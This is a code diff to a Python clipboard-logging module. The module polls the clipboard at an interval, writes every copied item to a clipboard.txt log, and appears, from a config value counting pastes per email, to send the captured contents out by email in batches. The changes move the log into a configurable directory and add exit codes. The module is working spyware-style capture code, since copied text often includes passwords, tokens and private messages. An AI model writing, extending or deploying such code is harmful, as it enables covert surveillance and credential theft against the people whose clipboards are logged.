@@ -1,20 +1,21 @@
 from pyperclip import paste
 from time import sleep
 from os import _exit
-
-from utils.tools import log, handle_counter
-from config import CLIPBOARD_INTERVAL, PASTES_PER_EMAIL
+from os.path import join
+from utils.utils import log, handle_counter
+from config import LOGS_DIRECTORY_PATH, CLIPBOARD_INTERVAL, PASTES_PER_EMAIL
 
 
 class ClipboardLogger:
     def __init__(self):
+        self.logs_directory_path = LOGS_DIRECTORY_PATH
         self.interval = CLIPBOARD_INTERVAL
         self.counter = 0
         self.counter_max = PASTES_PER_EMAIL
         self.running = True
 
     def log_clipboard(self):
-        log(paste(), "test.txt")
+        log(f'{paste().replace("\n", r'\n')}', join(self.logs_directory_path, "clipboard.txt"))
 
     def run(self):
         try:
@@ -36,7 +37,11 @@ def main():
     except Exception:
         clipboard_logger.running = False
         print("An error occured while logging clipboard.")
-        print("See full error here:") # TODO:  add where to find error log
+        print("See full error here:")  # TODO:  add where to find error log
+        return 1
+
+    return 0
+
 
 if __name__ == "__main__":
     _exit(main())
